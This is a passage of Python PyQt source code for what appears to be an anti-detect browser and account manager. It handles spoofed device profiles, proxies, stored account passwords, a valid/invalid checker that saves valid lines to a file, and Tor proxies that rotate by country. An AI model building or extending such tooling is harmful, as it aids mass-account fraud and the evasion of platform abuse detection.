		if comboBoxDevices == 'iPhone':
			self.list_phone_os = list(self.list_iPhone_resolution.keys())
			self.ui.comboBoxPhoneOS.clear()
			self.ui.comboBoxPhoneOS.addItems(self.list_phone_os)
			self.ui.comboBoxPhoneOS.setCurrentIndex(random.randint(0, self.ui.comboBoxPhoneOS.count()-1))  
		elif comboBoxDevices == 'Android':
			self.list_phone_os = list(self.list_android_resolution.keys())
			self.ui.comboBoxPhoneOS.clear()
			self.ui.comboBoxPhoneOS.addItems(self.list_phone_os)
			self.ui.comboBoxPhoneOS.setCurrentIndex(random.randint(0, self.ui.comboBoxPhoneOS.count()-1))
		else:
			self.ui.comboBoxPhoneOS.clear()
		self.set_user_agent(comboBoxDevices)
	def update_status(self, tag, data):
		if tag == 'create_profile':
			data_info = json.loads(data)
			QtWidgets.QMessageBox.about(self,'Notification', data_info['msg'])
		if tag == 'os_pid':
			self.list_browsers.update(json.loads(data))
   
		if tag == 'browser_closed':
			# print('===browser_closed===',json.loads(data)['id'])
			self.find_and_show_button(data)
   
		if tag == 'browser_opened':
			self.find_and_show_button(data, open_button=False)
   
		if tag == 'closed_browser':
			self.show_all_profiles()  
			self.show_all_accounts()
   
		if tag == 'remove_profiles':
			self.show_all_profiles()
			QtWidgets.QMessageBox.about(
				self, "Success", "Your selected profiles already removed!")
			self.listProfilesChecked = []
		if tag == 'import_cookies_to_profile':
			QtWidgets.QMessageBox.about(
				self, "Success", "Your selected profiles already updated!")
		if tag == 'update_new_profiles':
			self.show_all_profiles()
			QtWidgets.QMessageBox.about(
				self, "Success", "Your selected profiles already updated!")
			self.listProfilesChecked = []		
		if tag == 'accounts_update_new_profiles':
			self.show_all_accounts()
			QtWidgets.QMessageBox.about(
				self, "Success", "Your selected accounts already updated!")
			self.listAccountsChecked = []
		if tag == 'update_data_accounts':
			self.show_all_accounts()
		if tag == 'update_data':
			self.show_all_profiles()
		if tag == 'remove_emails':
			self.show_all_emails()
		if tag == 'remove_accounts':
			self.show_all_accounts()
			QtWidgets.QMessageBox.about(
				self, "Success", "Your selected accounts already removed!")
			self.listAccountsChecked = []
		if tag == 'set_auto_view':
			self.show_all_accounts()
			QtWidgets.QMessageBox.about(
				self, "Success", "Your selected accounts already updated!")
			self.listAccountsChecked = []	
		if tag == 'remove_auto_view':
			self.show_all_accounts()
			QtWidgets.QMessageBox.about(
				self, "Success", "Your selected accounts already updated!")
			self.listAccountsChecked = []	
		if tag == 'get_all_profiles':
			self.current_list_profiles = json.loads(data)
			self.showrowsProfiles(self.current_list_profiles)
		if tag == 'show_all_accounts':
			self.current_list_accounts = json.loads(data)
			self.showrowsAccounts(self.current_list_accounts)
 
		if tag == 'show_all_emails':
			self.current_list_emails = json.loads(data)
			self.showrowsEmails(self.current_list_emails)  

		if tag == 'show_all_signup_email':
			self.current_list_signup_emails = json.loads(data)
			self.showrowsSignupEmails(self.current_list_signup_emails)			
  
		if tag == 'add_accounts_emails':
			QtWidgets.QMessageBox.about(
				self, "Success", "Your emails have been updated!")
		if tag == 'email_msg':
			email_data = json.loads(data)
			if email_data not in self.emails_rows:
				self.emails_rows.append(email_data)
				self.showRowsSubjects()
		# if tag == 'update_accounts_emails':
		# 	QtWidgets.QMessageBox.about(
		# 		self, "Success", "Your emails have been updated!")
		if tag == 'input_captcha':
			print('==input_captcha==')
			data_info = json.loads(data)
			text, action = QtWidgets.QInputDialog.getText(
             self, 'Input Code Dialog', 'Enter the code:')
			if text and action:
				self.captchaQueQue.put(json.dumps({'id':data_info}))
		if tag == 'add_account':
			self.show_all_accounts()
			self.accountSetupUi.hide()
			QtWidgets.QMessageBox.about(
				self, "Success", "Your account already imported!")
		if tag == 'error':
			QtWidgets.QMessageBox.about(
				self, "Error", data)
   
		if tag == 'check_status':
			
			data_info = json.loads(data)
			if data_info['status'] == 'unknown':
				validTextEdit = self.ui.dontsupporttextEdit.toPlainText()
				self.ui.dontsupporttextEdit.setPlainText(validTextEdit+'\n'+data_info['line_check'])	
				self.total_checked+=1
				self.total_unkown+=1
			elif data_info['status'] == 'valid':
				validTextEdit = self.ui.validTextEdit.toPlainText()
				self.ui.validTextEdit.setPlainText(validTextEdit+'\n'+data_info['line_check'])	
				self.total_checked+=1
				self.total_valid+=1
				try:
					self.checker_save_file = open(self.fileSavePath, 'a', encoding='utf-8')
					self.checker_save_file.write(data_info['line_check']+'\n')
					self.checker_save_file.close()
				except Exception as e:
					pass
			elif data_info['status'] == 'invalid':
				self.total_checked+=1
				self.total_invalid+=1
			elif data_info['status'] == 'loading':
				self.total_check_list+=1
			else:
				self.total_checked+=1
				self.total_unkown+=1
			self.ui.statusLabel.setText('Status: checked %s/%s : %s valid, %s invalid' % (self.total_checked, self.total_check_list, self.total_valid, self.total_invalid) )
	def find_and_show_button(self,profile_info, open_button=True):
		for row in range(self.ui.tableWidgetProfiles.rowCount()):
			item_id = self.ui.tableWidgetProfiles.item(row, 1).text()
			if item_id == str(json.loads(profile_info)['id']):
				if open_button:
					self.buttonOpen = QtWidgets.QPushButton('Open', self)
					self.buttonOpen.clicked.connect(partial(self.handleButtonProfilesOpenClicked, json.loads(profile_info), self.buttonOpen))
					self.buttonOpen.setStyleSheet("background-color : #5d7f32")
				else:
					self.buttonOpen = QtWidgets.QPushButton('Close', self)
					self.buttonOpen.clicked.connect(partial(self.handleButtonProfilesOpenClicked, json.loads(profile_info), self.buttonOpen))
					self.buttonOpen.setStyleSheet("background-color : red")					
				checkbox = QCheckBox()
				if checkbox not in self.headerProfiles.all_header_combobox:
					self.headerProfiles.all_header_combobox.append(checkbox)
				checkbox.stateChanged.connect(
					lambda checked, row=row, row_db=profile_info: self.profiles_state_changed(checked, row, row_db))
				layout = QtWidgets.QHBoxLayout()
				layout.setContentsMargins(0,0,0,0)
				layout.setSpacing(0)
				layout.addWidget(checkbox)
				layout.addWidget(self.buttonOpen)
				cellWidget = QtWidgets.QWidget()
				cellWidget.setLayout(layout)    
				self.ui.tableWidgetProfiles.setCellWidget(row,0, cellWidget) 
		for row in range(self.ui.tableWidgetAccounts.rowCount()):
			item_id = self.ui.tableWidgetAccounts.item(row, 15).text()
			if item_id == str(json.loads(profile_info)['id']):
				account_info = None
				for line_account in self.all_accounts:
					if str(json.loads(profile_info)['id']) == str(line_account['browser_profiles']):
						account_info = line_account
						break
				if account_info:
					# print(account_info)
					if open_button:
						self.buttonOpen = QtWidgets.QPushButton('Open', self)
						self.buttonOpen.clicked.connect(partial(self.handleButtonAccountsOpenClicked, account_info, self.buttonOpen))
						self.buttonOpen.setStyleSheet("background-color : #5d7f32")
					else:
						self.buttonOpen = QtWidgets.QPushButton('Close', self)
						self.buttonOpen.clicked.connect(partial(self.handleButtonAccountsOpenClicked, account_info, self.buttonOpen))
						self.buttonOpen.setStyleSheet("background-color : red")						
					checkbox = QCheckBox()
					if checkbox not in self.headerAccounts.all_header_combobox:
						self.headerAccounts.all_header_combobox.append(checkbox)
					checkbox.stateChanged.connect(
						lambda checked, row=row, row_db=account_info: self.profiles_state_changed(checked, row, row_db))
					layout = QtWidgets.QHBoxLayout()
					layout.setContentsMargins(0,0,0,0)
					layout.setSpacing(0)
					layout.addWidget(checkbox)
					layout.addWidget(self.buttonOpen)
					cellWidget = QtWidgets.QWidget()
					cellWidget.setLayout(layout)    
					self.ui.tableWidgetAccounts.setCellWidget(row,0, cellWidget) 
     
	def findSignupEmails(self):
		textProfiles = self.emailSignupListUI.uiEmailSignupList.lineEditEmailSignupListFind.text()

		list_profiles = []
		for line_profile in self.current_list_signup_emails:
			for values in line_profile.values():
				if str(values).find(textProfiles) != -1 and line_profile not in list_profiles:
					list_profiles.append(line_profile)
					break
		self.emailSignupListUI.uiEmailSignupList.tableWidgetEmailSignupList.setRowCount(0)
		self.showrowsSignupEmails(list_profiles)        
     

	def findProfiles(self):
		# self.ui.tableWidgetProfiles.setRowCount(0)
		textProfiles = self.ui.comboBoxFindProfiles.currentText()

		list_profiles = []
		for line_profile in self.current_list_profiles:
			for values in line_profile.values():
				if str(values).find(textProfiles) != -1 and line_profile not in list_profiles:
					list_profiles.append(line_profile)
					break
		self.ui.tableWidgetProfiles.setRowCount(0)
		self.showrowsProfiles(list_profiles)
  
	def findAccounts(self):
		# self.ui.tableWidgetProfiles.setRowCount(0)
		textProfiles = self.ui.comboBoxFindAccounts.currentText()
		list_profiles = []
		for line_profile in self.current_list_accounts:
			for values in line_profile.values():
				if str(values).find(textProfiles) != -1 and line_profile not in list_profiles:
					list_profiles.append(line_profile)
					break
		self.ui.tableWidgetAccounts.setRowCount(0)
		self.showrowsAccounts(list_profiles)

	def findEmails(self):
		# self.ui.tableWidgetProfiles.setRowCount(0)
		textProfiles = self.ui.comboBoxFindEmails.currentText()
		list_profiles = []
		for line_profile in self.current_list_emails:
			for values in line_profile.values():
				if str(values).find(textProfiles) != -1 and line_profile not in list_profiles:
					list_profiles.append(line_profile)
					break
		self.ui.tableWidgetEmails.setRowCount(0)
		self.showrowsEmails(list_profiles)


	def handleButtonAccountsOpenClicked(self, row_db, buttonOpen):
		textbuttonOpen = buttonOpen.text()
		print('Open==', textbuttonOpen)
		if textbuttonOpen == 'Open':
			buttonOpen.setText('Close')
			buttonOpen.setStyleSheet("background-color : red")
			if self.totalAntiDetectQueue < int(self.limitThreading):
				print('==create new thearding==')
				self.AntiDetectTheard = AntiDetectThread(
					self.antiDetectQueque, self.statusqueue)
				self.AntiDetectTheard.start()
				self.totalAntiDetectQueue += 1
			data_put = {}
			data_put['action'] = 'open_account_browser'
			data_put['profile_id'] = row_db['browser_profiles']
			data_put['inject_info'] = self.inject_info['data']
			self.antiDetectQueque.put(data_put)
		else:
			buttonOpen.setText('Open')
			buttonOpen.setStyleSheet("background-color : #5d7f32")
			for line_browser in self.list_browsers.keys():
				if str(line_browser) == str(row_db['browser_profiles']):
					try:
						os.kill(int(self.list_browsers[line_browser]),signal.SIGILL)
					except:
						pass
				
	def handleButtonProfilesOpenClicked(self,row_db, buttonOpen):
		textbuttonOpen = buttonOpen.text()
		print('Open==',textbuttonOpen)
		if textbuttonOpen == 'Open':
			buttonOpen.setText('Close')
			buttonOpen.setStyleSheet("background-color : red")
			if self.totalAntiDetectQueue < int(self.limitThreading):
				print('==create new thearding==')
				self.AntiDetectTheard = AntiDetectThread(
					self.antiDetectQueque, self.statusqueue)
				self.AntiDetectTheard.start()
				self.totalAntiDetectQueue+=1
			data_put = {}
			data_put['action'] = 'open_browser'
			data_put['profile_browser'] = row_db
			data_put['inject_info'] = self.inject_info['data']
			self.antiDetectQueque.put(data_put)
		else:
			buttonOpen.setText('Open')
			buttonOpen.setStyleSheet("background-color : #5d7f32")
			for line_browser in self.list_browsers.keys():
				if str(line_browser) == str(row_db['id']):
					try:
						os.kill(int(self.list_browsers[line_browser]),signal.SIGILL)
					except:
						pass
			
	def handleButtonEmailsOpenClicked(self, row_db, buttonOpen):
		self.emails_rows = []
		if self.email_connected != row_db:
			print('==Clear email button==')
			buttonOpen.setText(str(row_db['id'])+'|Disconnect')
			buttonOpen.setStyleSheet("background-color : red")
			if self.totalAntiDetectQueue < int(self.limitThreading):
				print('==create new thearding==')
				self.AntiDetectTheard = AntiDetectThread(
					self.antiDetectQueque, self.statusqueue)
				self.AntiDetectTheard.start()
				self.totalAntiDetectQueue += 1
			data_put = {}
			data_put['action'] = 'connect_email'
			data_put['email'] = row_db
			self.antiDetectQueque.put(data_put)
			self.email_connected = row_db
		else:
			buttonOpen.setText(str(row_db['id'])+'|Connect')
			buttonOpen.setStyleSheet("background-color : #5d7f32")
			print('===clear table emails===')
			# self.ui.tableWidgetEmailSubjects.clear()
			self.email_connected = None	
		self.showrowsEmails(self.current_list_emails)
		# self.emails_rows = []
		# textbuttonOpen = buttonOpen.text()
		# if textbuttonOpen.find('Connect') != -1:
		# 	buttonOpen.setText(str(row_db['id'])+'|Disconnect')
		# 	buttonOpen.setStyleSheet("background-color : red")
		# 	if self.totalAntiDetectQueue < int(self.limitThreading):
		# 		print('==create new thearding==')
		# 		self.AntiDetectTheard = AntiDetectThread(
		# 			self.antiDetectQueque, self.statusqueue)
		# 		self.AntiDetectTheard.start()
		# 		self.totalAntiDetectQueue += 1
		# 	data_put = {}
		# 	data_put['action'] = 'connect_email'
		# 	data_put['email'] = row_db
		# 	self.antiDetectQueque.put(data_put)
		# else:
		# 	buttonOpen.setText(str(row_db['id'])+'|Connect')
		# 	buttonOpen.setStyleSheet("background-color : #5d7f32")
		# 	print('===clear table emails===')
		# 	self.ui.tableWidgetEmailSubjects.clear()

	@pyqtSlot(int)
	def profiles_state_changed(self, checked, row, row_db):
		if checked:
			if row_db['id'] not in self.listProfilesChecked:
				self.listProfilesChecked.append(row_db['id'])
		else:
			if row_db['id'] in self.listProfilesChecked:
				self.listProfilesChecked.remove(row_db['id'])
    
	@pyqtSlot(int)
	def accounts_state_changed(self, checked, row, row_db):
		if checked:
			if row_db['id'] not in self.listAccountsChecked:
				self.listAccountsChecked.append(row_db['id'])
		else:
			if row_db['id'] in self.listAccountsChecked:
				self.listAccountsChecked.remove(row_db['id'])
	@pyqtSlot(int)
	def emails_state_changed(self, checked, row, row_db):
		if checked:
			if row_db['id'] not in self.listEmailsChecked:
				self.listEmailsChecked.append(row_db['id'])
		else:
			if row_db['id'] in self.listEmailsChecked:
				self.listEmailsChecked.remove(row_db['id'])

	@pyqtSlot(int)
	def emails_signup_state_changed(self, checked, row, row_db):
		if checked:
			if row_db not in self.listSignupEmailsChecked:
				self.listSignupEmailsChecked.append(row_db)
		else:
			if row_db in self.listSignupEmailsChecked:
				self.listSignupEmailsChecked.remove(row_db)    
    
	def get_driver_status(self, browser_pid):
		try:
			result = psutil.pid_exists(browser_pid)
			return result
		except:
			return
	def create_button_profiles(self, row_db):
		profile_opened = False
		# print(self.list_browsers)
		if str(row_db['id']) in self.list_browsers:
			profile_opened = self.get_driver_status(self.list_browsers[str(row_db['id'])])
		if profile_opened:
			self.buttonOpen = QtWidgets.QPushButton('Close', self)
			self.buttonOpen.clicked.connect(
				partial(self.handleButtonProfilesOpenClicked, row_db, self.buttonOpen))
			self.buttonOpen.setStyleSheet("background-color : red")
		else:	
			self.buttonOpen = QtWidgets.QPushButton('Open', self)
			self.buttonOpen.clicked.connect(
				partial(self.handleButtonProfilesOpenClicked, row_db, self.buttonOpen))
			self.buttonOpen.setStyleSheet("background-color : #5d7f32")		
		return self.buttonOpen

	def create_button_accounts(self, row_db):
		profile_opened = False
		if str(row_db['browser_profiles']) in self.list_browsers:
			profile_opened = self.get_driver_status(self.list_browsers[str(row_db['browser_profiles'])])
		if profile_opened:
			self.buttonOpen = QtWidgets.QPushButton('Close', self)
			self.buttonOpen.clicked.connect(
				partial(self.handleButtonAccountsOpenClicked, row_db, self.buttonOpen))
			self.buttonOpen.setStyleSheet("background-color : red")	

		else:
			self.buttonOpen = QtWidgets.QPushButton('Open', self)
			self.buttonOpen.clicked.connect(
				partial(self.handleButtonAccountsOpenClicked, row_db, self.buttonOpen))
			self.buttonOpen.setStyleSheet("background-color : #5d7f32")	
		return self.buttonOpen

	def showrowsProfiles(self, rows):
		self.headerProfiles.all_header_combobox = []
		self.refesh_table = True
		rowCount = self.ui.tableWidgetProfiles.rowCount()
		row = 0
		self.all_profiles = rows
		for row_db in self.all_profiles:
			self.buttonOpen = self.create_button_profiles(row_db)
			checkbox = QCheckBox()
			if checkbox not in self.headerProfiles.all_header_combobox:
				self.headerProfiles.all_header_combobox.append(checkbox)
			# row = self.ui.tableWidgetProfiles.rowCount()
			checkbox.stateChanged.connect(
				lambda checked, row=row, row_db=row_db: self.profiles_state_changed(checked, row, row_db))
   
			layout = QtWidgets.QHBoxLayout()
			layout.setContentsMargins(0,0,0,0)
			layout.setSpacing(0)
			layout.addWidget(checkbox)
			layout.addWidget(self.buttonOpen)
			cellWidget = QtWidgets.QWidget()
			cellWidget.setLayout(layout)
			if row >= rowCount:
				self.ui.tableWidgetProfiles.insertRow(row)
			self.ui.tableWidgetProfiles.setCellWidget(row, 0, cellWidget)
			self.ui.tableWidgetProfiles.setItem(row, 1, QtWidgets.QTableWidgetItem(str(row_db["id"])))
			self.ui.tableWidgetProfiles.setItem(row, 2, QtWidgets.QTableWidgetItem(str(row_db["profile_os"])))
			self.ui.tableWidgetProfiles.setItem(row, 3, QtWidgets.QTableWidgetItem(str(row_db["profile_proxy_details"])))
			self.ui.tableWidgetProfiles.setItem(row, 4, QtWidgets.QTableWidgetItem(str(row_db["profile_socks5_details"])))
			self.ui.tableWidgetProfiles.setItem(row, 5, QtWidgets.QTableWidgetItem(str(row_db["profile_proxy_username"])))
			self.ui.tableWidgetProfiles.setItem(row, 6, QtWidgets.QTableWidgetItem(str(row_db["profile_proxy_password"])))
			self.ui.tableWidgetProfiles.setItem(row, 7, QtWidgets.QTableWidgetItem(str(row_db["profile_name"])))
			self.ui.tableWidgetProfiles.setItem(row, 8, QtWidgets.QTableWidgetItem(str(row_db["profile_status"])))
			self.ui.tableWidgetProfiles.setItem(row, 9, QtWidgets.QTableWidgetItem(str(row_db["profile_note"])))
			self.ui.tableWidgetProfiles.setItem(row, 10, QtWidgets.QTableWidgetItem(str(row_db["modified"])))
			self.ui.tableWidgetProfiles.setItem(row, 11, QtWidgets.QTableWidgetItem(str(row_db["created"])))
			# self.ui.tableWidgetProfiles.setCellWidget(row,10, self.buttonOpen) 
			row+=1
		self.refesh_table = False

	def showrowsAccounts(self, rows):
		self.headerAccounts.all_header_combobox = []
		self.all_accounts = rows
		self.refesh_table = True
		# self.ui.tableWidgetAccounts.setRowCount(0)
		rowCount = self.ui.tableWidgetAccounts.rowCount()
		row = 0
		for row_db in rows:
			self.buttonOpen = self.create_button_accounts(row_db)
			checkbox = QCheckBox()
			if checkbox not in self.headerAccounts.all_header_combobox:
				self.headerAccounts.all_header_combobox.append(checkbox)
			# row = self.ui.tableWidgetAccounts.rowCount()
			checkbox.stateChanged.connect(
				lambda checked, row=row, row_db=row_db: self.accounts_state_changed(checked, row, row_db))
			
			layout = QtWidgets.QHBoxLayout()

			# adjust spacings to your needs
			layout.setContentsMargins(0,0,0,0)
			layout.setSpacing(0)
			layout.addWidget(checkbox)
			layout.addWidget(self.buttonOpen)
			cellWidget = QtWidgets.QWidget()
			cellWidget.setLayout(layout)
			if row >= rowCount:
				self.ui.tableWidgetAccounts.insertRow(row)
			self.ui.tableWidgetAccounts.setCellWidget(row, 0, cellWidget)
			# self.ui.tableWidgetAccounts.setCellWidget(row, 0, self.buttonOpen)
			self.ui.tableWidgetAccounts.setItem(
				row, 1, QtWidgets.QTableWidgetItem(str(row_db["id"])))
			self.ui.tableWidgetAccounts.setItem(
				row, 2, QtWidgets.QTableWidgetItem(str(row_db["profile_os"])))
			self.ui.tableWidgetAccounts.setItem(
				row, 3, QtWidgets.QTableWidgetItem(str(row_db["proxy"])))
			self.ui.tableWidgetAccounts.setItem(
				row, 4, QtWidgets.QTableWidgetItem(str(row_db["socks5"])))
			self.ui.tableWidgetAccounts.setItem(
				row, 5, QtWidgets.QTableWidgetItem(str(row_db["proxy_username"])))
			self.ui.tableWidgetAccounts.setItem(
				row, 6, QtWidgets.QTableWidgetItem(str(row_db["proxy_password"])))
			self.ui.tableWidgetAccounts.setItem(
				row, 7, QtWidgets.QTableWidgetItem(str(row_db["type"])))
			self.ui.tableWidgetAccounts.setItem(
				row, 8, QtWidgets.QTableWidgetItem(str(row_db["email"])))
			self.ui.tableWidgetAccounts.setItem(
				row, 9, QtWidgets.QTableWidgetItem(str(row_db["username"])))
			self.ui.tableWidgetAccounts.setItem(
				row, 10, QtWidgets.QTableWidgetItem(str(row_db["password"])))
			self.ui.tableWidgetAccounts.setItem(
				row, 11, QtWidgets.QTableWidgetItem(str(row_db["auto_view"])))
			self.ui.tableWidgetAccounts.setItem(
				row, 12, QtWidgets.QTableWidgetItem(str(row_db["note"])))
			self.ui.tableWidgetAccounts.setItem(
				row, 13, QtWidgets.QTableWidgetItem(str(row_db["state"])))
			self.ui.tableWidgetAccounts.setItem(
				row, 14, QtWidgets.QTableWidgetItem(str(row_db["state_ip"])))
			self.ui.tableWidgetAccounts.setItem(
				row, 15, QtWidgets.QTableWidgetItem(str(row_db["browser_profiles"])))
			self.ui.tableWidgetAccounts.setItem(
				row, 16, QtWidgets.QTableWidgetItem(str(row_db["created"])))
			self.ui.tableWidgetAccounts.setItem(
				row, 17, QtWidgets.QTableWidgetItem(str(row_db["modified"])))
			self.ui.tableWidgetAccounts.setItem(
				row, 18, QtWidgets.QTableWidgetItem(str(row_db["viewed"])))
			row+=1
		self.refesh_table = False

	def create_button_emails(self, row_db):

		if self.email_connected == row_db:
			self.buttonOpen = QtWidgets.QPushButton(str(row_db['id'])+'|Disconnect', self)
			self.buttonOpen.clicked.connect(
				partial(self.handleButtonEmailsOpenClicked, row_db, self.buttonOpen))
			self.buttonOpen.setStyleSheet("background-color : red")	

		else:
			self.buttonOpen = QtWidgets.QPushButton(str(row_db['id'])+'|Connect', self)
			self.buttonOpen.clicked.connect(
				partial(self.handleButtonEmailsOpenClicked, row_db, self.buttonOpen))
			self.buttonOpen.setStyleSheet("background-color : #5d7f32")	
		return self.buttonOpen

	def showrowsEmails(self,rows):
		self.headerEmails.all_header_combobox = []

		self.refesh_table = True
		# self.ui.tableWidgetEmails.setRowCount(0)
		rowCount = self.ui.tableWidgetEmails.rowCount()
		row = 0
		for row_db in rows:
			self.buttonOpen = self.create_button_emails(row_db)
			checkbox = QCheckBox()
			if checkbox not in self.headerEmails.all_header_combobox:
				self.headerEmails.all_header_combobox.append(checkbox)
			
			checkbox.stateChanged.connect(
				lambda checked, row=row, row_db=row_db: self.emails_state_changed(checked, row, row_db))
			
			layout = QtWidgets.QHBoxLayout()

			# adjust spacings to your needs
			layout.setContentsMargins(0,0,0,0)
			layout.setSpacing(0)
			layout.addWidget(checkbox)
			layout.addWidget(self.buttonOpen)
			cellWidget = QtWidgets.QWidget()
			cellWidget.setLayout(layout)

			# self.ui.tableWidgetAccounts.setCellWidget(row, 0, self.buttonOpen)
			# self.ui.tableWidgetEmails.setItem(
			# 	row, 1, QtWidgets.QTableWidgetItem(str(row_db["id"])))
			if row >= rowCount:
				self.ui.tableWidgetEmails.insertRow(row)

			self.ui.tableWidgetEmails.setCellWidget(row, 0, cellWidget)	
			self.ui.tableWidgetEmails.setItem(
				row, 1, QtWidgets.QTableWidgetItem(str(row_db["email"])))
			self.ui.tableWidgetEmails.setItem(
				row, 2, QtWidgets.QTableWidgetItem(str(row_db["password"])))
			self.ui.tableWidgetEmails.setItem(
				row, 3, QtWidgets.QTableWidgetItem(str(row_db["proxy"])))
			self.ui.tableWidgetEmails.setItem(
				row, 4, QtWidgets.QTableWidgetItem(str(row_db["socks5"])))
			self.ui.tableWidgetEmails.setItem(
				row, 5, QtWidgets.QTableWidgetItem(str(row_db["state"])))
			self.ui.tableWidgetEmails.setItem(
				row, 6, QtWidgets.QTableWidgetItem(str(row_db["state_ip"])))
			# self.ui.tableWidgetEmails.setItem(
			# 	row, 8, QtWidgets.QTableWidgetItem(str(row_db["note"])))
			self.ui.tableWidgetEmails.setItem(
				row, 8, QtWidgets.QTableWidgetItem(str(row_db["created"])))
			self.ui.tableWidgetEmails.setItem(
				row, 9, QtWidgets.QTableWidgetItem(str(row_db["accounts_data"])))					
			row+=1
		self.refesh_table = False		
  
	def showrowsSignupEmails(self, rows):


		self.refesh_table = True
		# self.ui.tableWidgetEmails.setRowCount(0)
		rowCount = self.ui.tableWidgetCreatorStatus.rowCount()
		row = 0
		for row_db in rows:


			checkbox = QCheckBox()
			checkbox.setText(str(row_db["id"]))
			if checkbox not in self.headerSignupEmails.all_header_combobox:
				self.headerSignupEmails.all_header_combobox.append(checkbox)
			
			checkbox.stateChanged.connect(
				lambda checked, row=row, row_db=row_db: self.emails_signup_state_changed(checked, row, row_db))
			
			layout = QtWidgets.QHBoxLayout()

			# adjust spacings to your needs
			layout.setContentsMargins(0,0,0,0)
			layout.setSpacing(0)
			layout.addWidget(checkbox)

			cellWidget = QtWidgets.QWidget()
			cellWidget.setLayout(layout)


			if row >= rowCount:
				self.ui.tableWidgetCreatorStatus.insertRow(row)
			
			self.ui.tableWidgetCreatorStatus.setCellWidget(row, 0, cellWidget)

			self.ui.tableWidgetCreatorStatus.setItem(
				row, 1, QtWidgets.QTableWidgetItem(str(row_db["email"])))
			self.ui.tableWidgetCreatorStatus.setItem(
				row, 2, QtWidgets.QTableWidgetItem(str(row_db["password"])))
			self.ui.tableWidgetCreatorStatus.setItem(
				row, 3, QtWidgets.QTableWidgetItem(str(row_db["note"])))
			# self.ui.tableWidgetCreatorStatus.setItem(
			# 	row, 4, QtWidgets.QTableWidgetItem(str(row_db["created"])))
			
			row+=1
		self.refesh_table = False
  
	def showRowsSubjects(self):
		# print('==show emails subjects==')
		# self.headerEmailsSubjects.all_header_combobox = []
		self.refesh_table = True
		self.ui.tableWidgetEmailSubjects.setRowCount(0)
		rowCount = self.ui.tableWidgetEmailSubjects.rowCount()
		row = 0
		for row_db in self.emails_rows:		
			# row = self.ui.tableWidgetEmailSubjects.rowCount()
			# if row >= rowCount:
			self.ui.tableWidgetEmailSubjects.insertRow(row)

			self.ui.tableWidgetEmailSubjects.setItem(
				row, 0, QtWidgets.QTableWidgetItem(str(row_db["from_"])))
			self.ui.tableWidgetEmailSubjects.setItem(
				row, 1, QtWidgets.QTableWidgetItem(str(row_db["date"])))
			self.ui.tableWidgetEmailSubjects.setItem(
				row, 2, QtWidgets.QTableWidgetItem(str(row_db["subject"])))


		self.refesh_table = False		
		self.ui.tableWidgetEmailSubjects.setSizeAdjustPolicy(QtWidgets.QAbstractScrollArea.AdjustToContents)
  
		self.ui.tableWidgetEmailSubjects.resizeColumnsToContents()
		self.ui.tableWidgetEmailSubjects.horizontalHeader().setStretchLastSection(True)
		row+=1

class MunProxiesThread(QtCore.QThread):
	trigger = pyqtSignal(str, str)
	def __init__(self,munproxiesQueQue, statusqueue):
		QtCore.QThread.__init__(self)
		
		self.munproxiesQueQue = munproxiesQueQue
		self.statusqueue = statusqueue

	def run(self):
		self.mun_api = munantiapi.MunAntiApi()
		self.mun_proxy = munproxy.MunProxy()
		while 1:

			self.data_put = self.munproxiesQueQue.get()
			if 'action' in self.data_put:
				self.action = self.data_put['action']
				if self.action == 'create_mun_proxies':
					self.mun_proxy_details = self.data_put['data']
					SOCKS_PORT = None
					if self.mun_proxy_details['proxy_port']:
						SOCKS_PORT = self.mun_proxy_details['proxy_port']
					Rotating_time = 30
					Rotating = True
					if self.mun_proxy_details['proxy_time']:
						Rotating_time = int(self.mun_proxy_details['proxy_time'])
					else:
						Rotating  = False
					proxy_bridges=''
					if self.mun_proxy_details['proxy_bridges']:
						proxy_bridges = self.mun_proxy_details['proxy_bridges']
					country_name = self.mun_proxy_details['proxy_country']
					country_code = list_country[self.mun_proxy_details['proxy_country']]
					SOCKS_PORT, CONTROL_PORT, tor_process = self.mun_proxy.create_proxy(country_code, SOCKS_PORT=SOCKS_PORT, Rotating_time=Rotating_time, Rotating=Rotating, Bridge_String=proxy_bridges)
					
					data = self.mun_api.add_mun_proxies(data={'socks_port':SOCKS_PORT, 'control_port': CONTROL_PORT, 'bridges_string': proxy_bridges, 'rotating_time':Rotating_time,'country_name':country_name,'country_code':country_code})	
					print('====data',data)
					self.statusqueue.put(('create_mun_proxies', json.dumps({'SOCKS_PORT':SOCKS_PORT,'CONTROL_PORT':CONTROL_PORT})))
	
					list_tor_process.append((SOCKS_PORT, CONTROL_PORT, tor_process))
				if self.action == 'start_proxies':
					self.mun_proxy_details = self.data_put['data']
					print(self.mun_proxy_details)
					SOCKS_PORT = None
					if self.mun_proxy_details['socks_port']:
						SOCKS_PORT = self.mun_proxy_details['socks_port']
					CONTROL_PORT = None
					if self.mun_proxy_details['control_port']:
						CONTROL_PORT = self.mun_proxy_details['control_port']
					Rotating_time = 30
					Rotating = True
					if self.mun_proxy_details['rotating_time']:
						Rotating_time = int(self.mun_proxy_details['rotating_time'])
					else:
						Rotating  = False
					bridges_string=''
					if self.mun_proxy_details['bridges_string']:
						bridges_string = self.mun_proxy_details['bridges_string']
					country_name = self.mun_proxy_details['country_name']
					country_code = self.mun_proxy_details['country_code']
					SOCKS_PORT, CONTROL_PORT, tor_process = self.mun_proxy.create_proxy(country_code, SOCKS_PORT=SOCKS_PORT, CONTROL_PORT=CONTROL_PORT, Rotating_time=Rotating_time, Rotating=Rotating, Bridge_String=bridges_string)
					
					self.statusqueue.put(('start_proxies', json.dumps({'SOCKS_PORT':SOCKS_PORT,'CONTROL_PORT':CONTROL_PORT})))
	
					list_tor_process.append((SOCKS_PORT, CONTROL_PORT, tor_process))    

				if self.action == 'get_mun_proxies':
					data = self.mun_api.get_mun_proxies()
					# print(data)
					self.statusqueue.put(('get_mun_proxies', json.dumps(data['data'])))
				if self.action == 'remove_mun_proxies':
					print('==remove_mun_proxies==')
					list_remove = []
					for line_tor in list_tor_process:
						SOCKS_PORT, CONTROL_PORT, tor_process = line_tor
						for line_proxy in self.data_put['data']:
							if SOCKS_PORT == line_proxy['socks_port']:
								tor_process.kill()
								list_remove.append(line_tor)
					for line_remove in list_remove:
						list_tor_process.remove(line_remove)
					list_remove_update = []
					for line_proxy in self.data_put['data']:
						list_remove_update.append(line_proxy['id'])

     
					data_remove = {'list_id': list_remove_update}
					print(data_remove)
					data = self.mun_api.remove_mun_proxies(data_remove)
					self.statusqueue.put(('remove_mun_proxies', json.dumps(data)))

				if self.action == 'update_munproxies_by_id':
					data = self.mun_api.update_munproxies_by_id(self.data_put['data_update'])
							

			time.sleep(0.05)
 
class MunProxiesMain(QtWidgets.QWidget):
	def __init__(self, mainWindow):
